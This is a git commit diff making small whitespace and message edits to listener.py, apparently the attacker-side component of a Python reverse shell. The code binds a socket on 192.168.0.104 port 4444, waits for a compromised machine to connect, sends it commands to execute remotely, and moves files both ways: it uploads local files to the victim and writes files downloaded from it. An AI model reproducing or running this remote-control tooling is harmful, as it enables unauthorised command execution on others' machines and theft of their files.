825f7770741bff693efbbef5575bc60c796ba24e
d4rk-c0d3r <64041468+d4rk-c0d3r@users.noreply.github.com>
2020-04-21 15:26:00 -0500

    Update listener.py

--- listener.py
+++ listener.py
@@ -2,14 +2,13 @@ import socket, json, base64
 
 from pip._vendor.distlib.compat import raw_input
 
-
 class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((ip, port))
         listener.listen(0)
-        print("[+] Waiting for incoming connections ")
+        print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
         print("[+] Got a connection from " + str(address))
 
@@ -26,7 +25,6 @@ class Listener:
             except ValueError:
                 continue
 
-
     def execute_remotely(self, command):
         self.reliable_send(command)
         if command[0] == "exit":
@@ -37,7 +35,7 @@ class Listener:
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] Download successful. "
+            return "[+] Download successful "
 
     def read_file(self, path):
         with open(path, "rb") as file:
@@ -51,17 +49,13 @@ class Listener:
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])
                     command.append(file_content)
-
-
-
                 result = self.execute_remotely(command)
-
                 if command[0] == "download" and "[-] Error " not in result:
                     result = self.write_file(command[1], result)
             except Exception:
-                result = "[-] Error during command execution "
-
+                result = "[-] Error during command execution"
             print(result)
+
 
 my_listener = Listener("192.168.0.104", 4444)
 my_listener.run()
